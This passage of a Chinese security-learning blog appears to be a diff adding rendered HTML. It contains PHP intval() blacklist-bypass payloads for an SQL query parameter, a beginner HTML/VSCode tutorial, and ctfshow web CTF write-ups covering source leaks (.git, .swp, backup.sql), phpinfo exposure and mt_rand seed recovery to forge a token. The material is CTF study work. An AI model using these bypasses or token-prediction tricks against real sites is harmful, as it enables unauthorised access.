+<p>但在传参时一般使用第一种形式，经过测试发现，传参默认都是字符串类型，根据intval的字符串转换规则，如果字符串第一个字符不是数字就会直接返回0，所以后面两种形式都是返回0，只有第一种可以正确返回数字1</p>
+<p><img src="/img/image-20231101235921465.png" alt="image-20231101235921465"></p>
+<h3 id="取反-绕过"><a href="#取反-绕过" class="headerlink" title="取反~绕过"></a>取反~绕过</h3><p>当某个数字被过滤时，可以两次取反来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(intval(~10));  \\ -11</span><br><span class="line">var_dump(intval(~~10)); \\ 10</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="算数运算符绕过"><a href="#算数运算符绕过" class="headerlink" title="算数运算符绕过"></a>算数运算符绕过</h3><p>当某个数字被过滤时，可以使用算数运算符绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(intval(5*5));</span><br><span class="line">var_dump(intval(5+5));</span><br><span class="line">var_dump(intval(05+5));</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int(25)</span><br><span class="line">int(10)</span><br><span class="line">int(10)</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQL注入intval-函数绕过黑名单方法"><a href="#SQL注入intval-函数绕过黑名单方法" class="headerlink" title="SQL注入intval()函数绕过黑名单方法"></a>SQL注入intval()函数绕过黑名单方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag in id=1000</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;</span>,<span class="variable">$id</span>))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment"># id 小于 999 拼接sql语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">根据黑名单的不同，访问?id=<span class="number">1000</span>有以下几种方法:</span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span> <span class="comment">//&quot;1000&quot;或(1000)皆可</span></span><br><span class="line">?id=<span class="number">125</span>&lt;&lt;<span class="number">3</span> <span class="comment">//左移</span></span><br><span class="line">?id=<span class="number">680</span>|<span class="number">320</span> <span class="comment">//按位或</span></span><br><span class="line">?id=<span class="number">992</span>^<span class="number">8</span> <span class="comment">//按位异或</span></span><br><span class="line">?id=~~<span class="number">1000</span> <span class="comment">//两次取反</span></span><br><span class="line">?id=<span class="number">0x3e8</span> <span class="comment">//十六进制</span></span><br><span class="line">?id=<span class="number">0b1111101000</span> <span class="comment">//二进制</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.html" itemprop="url">前端基础学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-10-28T10:21:20+08:00">
+                2023-10-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><img src="/img/image-20231028104405040.png" alt="image-20231028104405040"></p>
+<p> <code>&lt;!DOCTYPE&gt;</code>：文档类型声明，作用是告诉浏览器使用哪种HTML版本来显示网页</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>代码意思是当前页面采取的是HTML5版本来显示网页</p>
+<p><code>lang</code>：定义显示语言，这个属性主要对浏览器是否翻译网页有用，不影响非定义中的语言的显示  </p>
+<p><code>meta</code>标签中的<code>charset</code>属性用来规定html文档应该使用哪种字符编码</p>
+<h2 id="html常用标签"><a href="#html常用标签" class="headerlink" title="html常用标签"></a>html常用标签</h2><p><code>&lt;br /&gt;</code>：换行标签</p>
+<p><code>&lt;div&gt;、&lt;span&gt; </code>：盒子标签，用来装内容</p>
+<p><code>&lt;img src=&quot;图像URL&quot; /&gt;</code>:图像标签，相对路径是相对html文件，如果直接是图片名，说明在同一级。也可以使用绝对路径，网络上的或者本地从盘符开始</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alt：图片显示不出来代替的文字</span><br><span class="line">title：鼠标放在图片上提示的文字 </span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;a&gt;</code>:超链接标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;跳转目标&quot; target=&quot;目标窗口的弹出方式&quot;&gt;文本或图像&lt;/a&gt;</span><br><span class="line">target:_self(默认 替换当前页面)、_blank(新窗口打开)</span><br></pre></td></tr></table></figure>
+
+<p>链接分类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">外部链接:例如&lt;a href= &quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;</span><br><span class="line">内部链接:网站内部页面之间的相互链接,直接链接内部页面名称即可,例如&lt;a href=&quot;index.html&quot;&gt;首页&lt;/a&gt;</span><br><span class="line">空链接：&lt;a href=&quot;#&quot;&gt;地址&lt;/a&gt;，开发过程中</span><br><span class="line">下载链接:如果href里面地址是一个文件.exe或者压缩包.zip,会下载这个文件</span><br><span class="line"></span><br><span class="line">网页元素链接:在网页中的各种网页元素,如文本、图像、表格、音频、视频等都可以添加超链接</span><br><span class="line">&lt;a href=&quot;http://www.baidu.com&quot;&gt;&lt;img src=&quot;img.jpg&quot;/&gt;&lt;/a&gt; 点击图片即可跳转</span><br><span class="line">  </span><br><span class="line">锚点链接:点击链接，可以快速定位到页面中的某个位置</span><br><span class="line">在链接文本的href属性中,设置属性值为#名字的形式,如&lt;a href=&quot;#two&quot;&gt;第2集&lt;/a&gt;</span><br><span class="line">找到目标位置标签,里面添加一个id属性=刚才的名字, 如: &lt;h3 id=&quot;two&quot;&gt;第2集介绍&lt;/h3&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;!-- 注释语句 --&gt;</code>：注释标签，可在源代码中显示</p>
+<p>特殊字符：在HTML页面中,一些特殊的符号很难或者不方便直接使用 ,此时我们就可以使用下面的字符来替代</p>
+<p><img src="/img/image-20231028114851140.png" alt="image-20231028114851140"></p>
+<h3 id="表格标签-用来展示数据"><a href="#表格标签-用来展示数据" class="headerlink" title="表格标签:用来展示数据"></a>表格标签:用来展示数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">	&lt;tr&gt;</span><br><span class="line">		&lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">		&lt;td&gt;单元格内的文字&lt;/td&gt;</span><br><span class="line">		...</span><br><span class="line">	&lt;/tr&gt;</span><br><span class="line">	...</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;:定义表格，&lt;tr&gt;定义表格中的行，&lt;td&gt;：定义表格中的单元格。&lt;th&gt;表头标签。都是双标签</span><br><span class="line">&lt;thead&gt; &lt;/thead&gt; :用于定义表格的头部。&lt;thead&gt; 内部必须拥有&lt;tr&gt;标签。一般是位于第一行</span><br><span class="line">&lt;tbody&gt; &lt;/tbody&gt; :用于定义表格的主体,主要用于放数据本体</span><br></pre></td></tr></table></figure>
+
+<h3 id="列表标签：用来布局"><a href="#列表标签：用来布局" class="headerlink" title="列表标签：用来布局"></a>列表标签：用来布局</h3><p>1、无序列表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;u1&gt;</span><br><span class="line">&lt;li&gt;列表项1&lt;/li&gt;</span><br><span class="line">&lt;li&gt;列表项2&lt;/li&gt;</span><br><span class="line">&lt;li&gt;列表项3&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2、有序列表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol&gt;</span><br><span class="line">&lt;1i&gt;列表项1&lt;/li&gt;</span><br><span class="line">&lt;li&gt;列表项2&lt;/1i&gt;</span><br><span class="line">&lt;1i&gt;列表项3&lt;/li&gt;</span><br><span class="line">&lt;/o1&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3、自定义列表（重点）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dl&gt;</span><br><span class="line">&lt;dt&gt;名词1&lt;/dt&gt;</span><br><span class="line">&lt;dd&gt;名词1解释1&lt;/dd&gt;</span><br><span class="line">&lt;dd&gt;名词1解释2&lt;/dd&gt;</span><br><span class="line">&lt;/d1&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="表单标签"><a href="#表单标签" class="headerlink" title="表单标签"></a>表单标签</h3><p>目的：收集用户信息</p>
+<p>组成：在HTML中,一个完整的表单通常由表单域、表单控件(也称为表单元素)和提示信息3个部分构成</p>
+<p>1、表单域</p>
+<p>表单域是一个包含表单元素的区域。在HTML标签中，<code>&lt;form&gt; </code>标签用于定义表单域,以实现用户信息的收集和传递。<code>&lt;form&gt;</code>会把它范围内的表单元素信息提交给服务器，那么如果点击提交按钮就会跳转到url地址，如果是get，就会是xxx.php?pwd&#x3D;x&amp;username&#x3D;X</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;url地址&quot; method=&quot;提交方式&quot; name=&quot;表单域名称&quot;&gt;</span><br><span class="line">各种表单元素控件</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231028201629013.png" alt="image-20231028201629013"></p>
+<p>2、表单控件</p>
+<p>在表单域中可以定义各种表单元素,这些表单元素就是允许用户在表单中输入或者选择的内容控件。</p>
+<p>(1) input输入表单元素 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;属性值&quot; /&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231028202317577.png" alt="image-20231028202317577"></p>
+<p>提交表单元素，value规定按钮中的文字内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;submit&quot; value=&quot;免费注册&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>button</strong>用来和js搭配使用，启动js脚本的动作</p>
+<p><strong>file</strong>上传文件</p>
+<p>除了type属性外<code>&lt;input&gt;</code>标签的其他属性</p>
+<p><img src="/img/image-20231028203442210.png" alt="image-20231028203442210"></p>
+<p><strong>name</strong>属性区分表单元素，单选和多选的每个表单元素需要有相同的name属性</p>
+<p><strong>checked</strong>主要针对单选和复选框，页面打开的时候默认选中</p>
+<p><strong>value</strong>在非选择框中规定输入框中默认的文字，在选择框中代表选择之后送到后台的内容</p>
+<h4 id="一个关于表单的测试"><a href="#一个关于表单的测试" class="headerlink" title="一个关于表单的测试"></a>一个关于表单的测试</h4><p><img src="/img/image-20231028205221478.png" alt="image-20231028205221478"></p>
+<p><img src="/img/image-20231028205247822.png" alt="image-20231028205247822"></p>
+<p>观察到url地址的变化，转到action指定的处理脚本路径，后面是对应的get传参，参数名就是前面input标签中定义的name属性值。但是由于我没有提前在网站根目录中创建login.php文件，所以显示无法找到</p>
+<p><img src="/img/image-20231028205313188.png" alt="image-20231028205313188"></p>
+<p>补充：<code>&lt;label&gt;</code>标签用于绑定一个表单元素 当点击<code>&lt;label&gt;</code>内的文本时,浏览器就会自动将焦点(光标转到或者<br>选择对应的表单元素上用来增加用户体验</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">男&lt;input type=&quot;radio&quot; name=&quot;sex&quot;/&gt;</span><br><span class="line">-&gt;</span><br><span class="line">&lt;label for=&quot;sex&quot;&gt;男&lt;/label&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; id=&quot;sex&quot; /&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>id属性和label中的for属性需一致</p>
+<p>（2）select下拉表单元素</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select&gt;</span><br><span class="line">&lt;option&gt;选项1&lt;/option&gt;</span><br><span class="line">&lt;option&gt;选项2&lt;/option&gt;</span><br><span class="line">&lt;option&gt;选项3&lt;/opt ion&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>&lt;option&gt;</code>中定义selected &#x3D;”selected”时,当前项即为默认选中项</p>
+<p>（3）textarea 文本域元素</p>
+<p>使用场景:当用户输入内容较多的情况下,我们就不能使用文本框表单了,此时我们可以使用该标签。评论、反馈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea rows=&quot;3&quot; cols=&quot;20&quot;&gt;</span><br><span class="line">默认文本内容</span><br><span class="line">&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>
+
+<p>cols每行字符数，rows显示的行数</p>
+<p><strong>关于html常用的vscode插件</strong><br>1、Auto Rename Tag:双击html的标签并修改会前后一起改变<br>2、One Dark Pro:一款颜色主题<br>3、系统自带格式化：设置-&gt;文本编辑器-&gt;格式化-&gt;勾上format on paste和format on save<br>4、open in browser ：可以在浏览器中显示页面<br>右键选择open in default browser在默认浏览器打开<br>5、Live Server(推荐) ： 实时预览，但首先需要打开一个文件夹<br>右键选择open in Live Server，也是在浏览器中打开但和上面不同的是内容会随代码的改变而实时变化<br>6、Easy LESS ： 我们写的less不能直接引入到html文件中，通过这个插件可以自动帮我们生成css文件<br>7、会了吧 ： 英文翻译，点击左侧的会<br>8、vscode-icons 图标修改</p>
+<p><strong>vscode常用快捷键</strong></p>
+<ul>
+<li>ctrl + -&#x2F;+ ：缩小放大代码</li>
+<li>shift + alt + 下键 ： 选中某行并复制到下一行</li>
+<li>ctrl + d ：先双击选定一个单词，然后按下ctrl+d可以往下依次选择相同的单词，这样同时修改相同的单词就非常方便</li>
+<li>ctrl + alt+  上或下：添加多个光标，可以同时添加内容</li>
+<li>ctrl + h：全局查找替换某个单词</li>
+<li>ctrl + g：跳转到某行</li>
+<li>shift + alt 然后拖动鼠标选中一个区块，可以一起删除</li>
+<li>ctrl + &#x2F; ：单行注释</li>
+<li>自定义快捷键：左下角管理-&gt;键盘快捷方式，查找shift + alt + a(原本的多行注释快捷键)，点击修改，直接按键修改，回车就修改成功，那么多行注释就变成ctrl + shift + &#x2F;</li>
+</ul>
+<h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/ctfshow-web%E5%85%A5%E9%97%A8.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/ctfshow-web%E5%85%A5%E9%97%A8.html" itemprop="url">ctfshow-web入门</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-10-22T16:52:09+08:00">
+                2023-10-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个只选择性的摘录ctfshow中的web入门题目，作为后面复习的资料</p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>当右键被禁掉的时候可以使用ctrl+u查看网页源代码</p>
+<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>.开头的文件夹在linux操作系统中是隐藏文件，所以开发人员可能错误地将.git文件夹部署到生产环境中，导致源码泄露等问题。.svn同理，svn也是一个版本控制软件<br>本题直接访问&#x2F;.git</p>
+<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>在linux中使用vim更改文件内容，如果非正常退出就会产生一个交换文件，如：index.php.swp,会以隐藏文件的形式在文件夹下<br>本题直接访问下载&#x2F;index.php.swp</p>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>f12，刷新页面，打开存储中的cookie</p>
+<p><img src="/img/image-20231022180505270.png" alt="image-20231022180505270"></p>
+<p>flag需要解码，这里可以使用hackbar自带的</p>
+<p><img src="/img/image-20231022180703155.png" alt="image-20231022180703155"></p>
+<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>域名解析查询</p>
+<p><a target="_blank" rel="noopener" href="https://ipw.cn/dns/">https://ipw.cn/dns/</a></p>
+<p><img src="/img/image-20231022192951769.png" alt="image-20231022192951769"></p>
+<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>题目：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
+<p>访问&#x2F;tz.php,点击查看phpinfo</p>
+<p><img src="/img/image-20231022202609335.png" alt="image-20231022202609335"></p>
+<p>flag在环境变量里，这也是信息泄露的一种</p>
+<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>题目：备份的sql文件会泄露敏感信息</p>
+<p>&#x2F;backup.sql</p>
+<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>题目：不要着急，休息，休息一会儿，玩101分给你flag</p>
+<p>右键源代码</p>
+<p><img src="/img/image-20231022204735548.png" alt="image-20231022204735548"></p>
+<p>查看js文件</p>
+<p><img src="/img/image-20231022204809378.png" alt="image-20231022204809378"></p>
+<p>控制台直接运行弹窗</p>
+<p><img src="/img/image-20231022204849578.png" alt="image-20231022204849578"></p>
+<p><img src="/img/image-20231022204904625.png" alt="image-20231022204904625"></p>
+<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>题目：密钥什么的，就不要放在前端了</p>
+<p>根据提示直接右键源代码</p>
+<p><img src="/img/image-20231023195713890.png" alt="image-20231023195713890"></p>
+<p>可以直接post提交账号密码，也可以通过AES解密获得密码登录，这里直接放出了密钥的加密过程，AES所必须的密码和偏移量都知道了，选择ZeroPadding填充，CBC模式，hex编码输出，base64不行</p>
+<p><img src="/img/image-20231023200453885.png" alt="image-20231023200453885"></p>
+<h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p><img src="/img/image-20231102190423779.png" alt="image-20231102190423779"></p>
+<p>取消url编码 因为在进行base64加密的时候在最后可能存在 &#x3D;&#x3D; ,如果进行url编码就会影响base64加密的结果</p>
+<p><img src="/img/image-20231102190726078.png" alt="image-20231102190726078"></p>
+<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p><img src="/img/image-20231102193815520.png" alt="image-20231102193815520"></p>
+<p>这题给我的思路就是如果代码看不懂，可以把代码搬到本地爆破调试，当通过两个if的时候有输出提示</p>
+<p><img src="/img/image-20231102193931184.png" alt="image-20231102193931184"></p>
+<p><img src="/img/image-20231102194000656.png" alt="image-20231102194000656"></p>
+<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p><img src="/img/image-20231102195258485.png" alt="image-20231102195258485"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(372619038);</span><br><span class="line">echo intval(mt_rand());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ps:不同版本的php得出的结果有差异</p>
+<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><p>考点是如果知道随机数中的某个值，有概率反推出seed</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>这题的种子没有直接告诉我们，但是要获得flag，必须传入正确的token，所以要反推seed。</p>
+<p>我们可以通过让intval（$r）&#x3D;0 让$rand不为0不满足if条件输出rand的值，同时可以获得mt_rand()第一次产生的随机数值的负数形式</p>
+<p><img src="/img/image-20231102201425306.png" alt="image-20231102201425306"></p>
+<p>使用随机数反推seed工具</p>
+<p><img src="/img/image-20231102201452631.png" alt="image-20231102201452631"></p>
+<p>因为上一题是用7.3版本得出正确的随机数，所以我们这一题自然想先尝试7.1.0+版本，图中的16和10进制都可以，是等价的。要注意的是seed确定之后每次生成的随机数是固定的，第一二三次的值固定，所以第一次生成随机数的操作不能省略。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">0x7135c313</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$token</span>=(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到token，传入cookie</p>
+<p><img src="/img/image-20231102202705326.png" alt="image-20231102202705326"></p>
+<p>别忘了传r，根据if的条件，$rand要等于0，所以传入<code>?r=435058645</code>,刷新得到flag</p>
+<p>ctfshow{e8e1e54d-da65-42bd-9a4b-6f88ccf56c43}</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
